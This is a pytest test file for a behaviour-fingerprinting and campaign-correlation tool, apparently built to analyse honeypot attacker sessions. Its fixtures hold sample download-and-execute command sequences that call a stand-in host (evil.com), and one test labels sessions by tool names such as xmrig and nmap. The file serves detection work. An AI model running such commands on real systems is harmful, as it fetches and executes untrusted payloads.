import pytest
from datetime import datetime
from features.fingerprint import FingerprintGenerator


class TestFingerprintGenerator:
    """Tests for FingerprintGenerator."""

    @pytest.fixture
    def generator(self):
        return FingerprintGenerator(include_temporal=True, include_count=True)

    @pytest.fixture
    def sample_sessions(self):
        return [
            {
                "session_id": "s1",
                "src_ip": "192.168.1.1",
                "commands": ["wget http://evil.com", "chmod +x payload", "./payload"],
                "session_duration": 45.0,
                "start_time": datetime(2025, 1, 15, 8, 0, 0)
            },
            {
                "session_id": "s2",
                "src_ip": "192.168.1.2",
                "commands": ["wget http://evil.com", "chmod +x payload", "./payload"],
                "session_duration": 50.0,
                "start_time": datetime(2025, 1, 15, 9, 0, 0)
            },
            {
                "session_id": "s3",
                "src_ip": "10.0.0.1",
                "commands": ["ls", "pwd"],
                "session_duration": 5.0,
                "start_time": datetime(2025, 1, 15, 10, 0, 0)
            },
        ]

    def test_generate_fingerprint(self, generator, sample_sessions):
        result = generator.generate(sample_sessions)

        assert all("behavior_fingerprint" in s for s in result)
        assert len(result[0]["behavior_fingerprint"]) == 64  # SHA-256 hex length

    def test_fingerprint_consistency(self, generator, sample_sessions):
        result = generator.generate(sample_sessions)

        # s1 and s2 have same commands, should have same fingerprint (different duration though)
        # With temporal included, they differ
        fp1 = result[0]["behavior_fingerprint"]
        fp2 = result[1]["behavior_fingerprint"]
        fp3 = result[2]["behavior_fingerprint"]

        assert fp1 != fp3
        assert fp2 != fp3

    def test_correlate_campaigns(self, generator, sample_sessions):
        fingerprinted = generator.generate(sample_sessions)
        campaigns = generator.correlate_campaigns(fingerprinted, min_ips=2)

        # s1 and s2 have similar patterns but different durations
        # With temporal included, they might not correlate
        assert isinstance(campaigns, dict)

    def test_classify_campaign(self, generator):
        assert generator._classify_campaign(["wget", "chmod", "xmrig"]) == "CRYPTOMINER"
        assert generator._classify_campaign(["wget", "chmod", "execute"]) == "PAYLOAD_DEPLOYMENT"
        assert generator._classify_campaign(["nmap", "masscan"]) == "RECONNAISSANCE"
